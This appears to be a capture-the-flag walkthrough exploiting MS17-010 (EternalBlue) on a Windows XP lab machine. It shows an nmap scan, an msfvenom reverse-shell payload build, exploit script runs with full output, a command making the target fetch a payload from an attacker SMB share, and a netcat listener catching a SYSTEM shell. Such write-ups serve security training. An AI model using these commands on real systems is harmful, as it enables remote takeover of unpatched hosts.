# Microsoft Security Bulletin MS17-010 (EternalBlue/MS17-010)

## Scanning

```
$ nmap -p 139,445 --script smb-vul* 10.10.10.4 -Pn
<snip>
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
```

## send_and_execute.py

Using exploit `send_and_execute.py`, let's create file `shell.exe`

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 EXITFUNC=thread -f exe -a x86 --platform windows -o shell.exe
```

Get Reverse shell

> Make sure the exploit in same folder with file [mysmb.py](https://raw.githubusercontent.com/helviojunior/MS17-010/master/mysmb.py)

```
$ python send_and_execute.py 10.10.10.4 shell.exe
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x82125da8
SESSION: 0xe2187430
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe20e5f10
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe20e5fb0
overwriting token UserAndGroups
Sending file TD4QOI.exe...
Opening SVCManager on 10.10.10.4.....
Creating service LaSZ.....
Starting service LaSZ.....

```

```
┌──(Hades㉿10.10.14.6)-[0.6:19.5]~
└─$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.4] 1032
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

## cmd.py

Using custom exploit with cmd input

```
┌──(Hades㉿10.10.14.6)-[0.7:20.3]~/…/RemoteCodeExecution/SMB-Services/microsoft/ms17-010
└─$ python cmd.py 10.10.10.4 '\\10.10.14.6\public\shell.exe'
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x82125da8
SESSION: 0xe10eab50
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe2360998
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe2360a38
overwriting token UserAndGroups
run command: cmd /c \\10.10.14.6\public\shell.exe
Opening SVCManager on 10.10.10.4.....
Creating service vRyN.....
Starting service vRyN.....
The NETBIOS connection with the remote host timed out.
Removing service vRyN.....
ServiceExec Error on: 10.10.10.4
nca_s_proto_error
Done
```

## Reference

[https://github.com/helviojunior/MS17-010](https://github.com/helviojunior/MS17-010)

[https://github.com/leecybersec/walkthrough/tree/master/hackthebox/legacy](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/legacy)